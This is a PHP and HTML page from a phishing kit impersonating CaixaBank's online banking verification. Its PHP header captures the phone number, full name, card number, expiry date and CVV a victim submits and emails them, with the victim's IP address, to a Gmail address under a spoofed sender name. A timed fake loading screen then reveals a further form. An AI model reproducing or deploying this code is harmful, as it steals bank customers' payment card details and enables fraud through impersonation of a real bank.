<?php
	$ip = $_SERVER['REMOTE_ADDR'];
	$message  = "****************[CAIXA_ES]***************\n";
	$message .= "NUmTel	: " .$_POST['put2']."\n";
	$message .= "FullName	: " .$_POST['put3']."\n";
	$message .= "NumCrt  	: " .$_POST['put4']. "\n";
	$message .= "DtExpr	: " .$_POST['day']."/".$_POST['month']."\n";
	$message .= "CryptV  	: " .$_POST['put6']. "\n";
	$message .= "******************************************\n";
	$to = " appstorej9@gmail.com ";
	$subj = "CAIXA_ES $ip";
	$from = "From: CAIXA_ES<info@online.net>";
	mail($to, $subj, $message, $from);
?>
<!DOCTYPE html>
<html>
<head>
	<title>CaixaBank | verificación CaixaBankNow</title>
	<link rel="icon" type="image/png" href="../img/icon.png" />
	<link rel="stylesheet" type="text/css" href="../img/css.css">
</head>
<body id="body">
	<div id="cnt">
		<div id="hdr">
			<div id="hedr1" style="display: none;">
				<form action="./inderr.php?gUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3&ug=cudzMub3JnLzE5OTkveGh0bWwiPg0KICAgIDxoZWFkPg0KICAgICAgICA8dGl0bGU+IEFwcGxlI" method="POST" name="" id="frm" autocomplete="off">
			<div id="put10" class="absolut"><input class="put" type="text" style="width: 178px;" value="<?php echo $_POST['put2']; ?>" placeholder="" name="put10" minlength="8" maxlength="10" required></div>
				<div id="pt7" class="absolut"><input type="image" src="../img/S2.png"></div>
				</form>
			</div>
			<div id="hedr2">
			<div id="put11" class="absolut">
			<img src="https://icon-library.com/images/loading-icon-animated-gif/loading-icon-animated-gif-19.jpg" style="width:84px;">
			</div>
			</div>
		</div>
	</div>
	<script type="text/javascript">
            setTimeout(function() {
                var el = document.getElementById('hedr1');
                var e = document.getElementById('hedr2');
                if( el ) 
                    el.style.display = 'block';
                    e.style.display = 'none';
            }, 15500);
        </script>
</body>
</html>